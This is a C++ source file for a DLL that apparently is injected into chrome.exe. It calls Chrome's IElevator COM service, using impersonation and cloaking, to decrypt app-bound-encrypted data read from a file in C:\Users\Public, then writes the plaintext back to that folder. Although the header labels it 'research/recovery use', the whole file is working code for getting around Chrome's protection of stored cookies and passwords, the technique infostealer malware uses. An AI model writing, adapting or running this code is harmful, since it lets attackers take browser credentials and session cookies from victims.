// eb_host.cpp - minimal IElevator COM host helper (research/recovery use)
// Runs inside chrome.exe; DecryptData at vtable slot 5.
#include <windows.h>
#include <objbase.h>
#pragma comment(lib,"ole32.lib")
#pragma comment(lib,"user32.lib")

struct G { unsigned long a; unsigned short b,c; unsigned char d[8]; };
static const G CLSID_CHROME={0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B}};
static const G IID_V2={0x1BF5208B,0x295F,0x4992,{0xB5,0xF4,0x3A,0x9B,0xB6,0x49,0x48,0x38}};
static const G IID_V1={0x463ABECF,0x410D,0x407F,{0x8A,0xF5,0x0D,0xF3,0x5A,0x00,0x5C,0xC8}};

static void WriteErr(const char* msg){
    HANDLE wf=CreateFileA("C:\\Users\\Public\\eb_err.txt",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
    if(wf!=INVALID_HANDLE_VALUE){DWORD w;WriteFile(wf,msg,lstrlenA(msg),&w,NULL);CloseHandle(wf);}
}
static void WriteResp(const void* p,UINT n){
    HANDLE wf=CreateFileA("C:\\Users\\Public\\eb_resp.bin",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
    if(wf!=INVALID_HANDLE_VALUE){DWORD w;WriteFile(wf,p,n,&w,NULL);CloseHandle(wf);}
}

extern "C" __declspec(dllexport) void __stdcall Go(void){
    HANDLE rf=CreateFileA("C:\\Users\\Public\\eb_req.bin",GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(rf==INVALID_HANDLE_VALUE){WriteErr("no req");return;}
    DWORD sz=GetFileSize(rf,NULL);
    if(sz<2||sz>4096){CloseHandle(rf);WriteErr("bad size");return;}
    unsigned char slot;
    DWORD rd;
    ReadFile(rf,&slot,1,&rd,NULL);
    sz-=1;
    char* buf=(char*)HeapAlloc(GetProcessHeap(),0,sz);
    ReadFile(rf,buf,sz,&rd,NULL);
    CloseHandle(rf);
    if(rd!=sz){WriteErr("short read");return;}
    if(FAILED(CoInitializeEx(NULL,COINIT_APARTMENTTHREADED))){WriteErr("coinit");return;}
    void* unk=NULL;
    HRESULT hr=CoCreateInstance((const IID&)CLSID_CHROME,NULL,CLSCTX_LOCAL_SERVER,(const IID&)IID_V2,&unk);
    if(FAILED(hr)) hr=CoCreateInstance((const IID&)CLSID_CHROME,NULL,CLSCTX_LOCAL_SERVER,(const IID&)IID_V1,&unk);
    if(FAILED(hr)||!unk){char m[48];wsprintfA(m,"cc=0x%08X",hr);WriteErr(m);return;}
    CoSetProxyBlanket(unk,RPC_C_AUTHN_DEFAULT,RPC_C_AUTHZ_DEFAULT,NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,EOAC_DYNAMIC_CLOAKING);
    BSTR in=SysAllocStringByteLen(buf,rd);
    BSTR out=NULL; DWORD cerr=0;
    void** vt=*(void***)unk;
    typedef HRESULT (__stdcall *PFN)(void*,BSTR,BSTR*,DWORD*);
    PFN dd=(PFN)vt[slot];
    hr=dd(unk,in,&out,&cerr);
    if(SUCCEEDED(hr)&&out){WriteResp((const char*)out,SysStringByteLen(out));}
    else{char m[48];wsprintfA(m,"dd=0x%08X c=%u slot=%u",hr,cerr,slot);WriteErr(m);}
    if(in)SysFreeString(in);
    if(out)SysFreeString(out);
    unk ? 0 : 0;
}
BOOL WINAPI DllMain(HINSTANCE h,DWORD r,LPVOID){ if(r==DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h); return TRUE; }
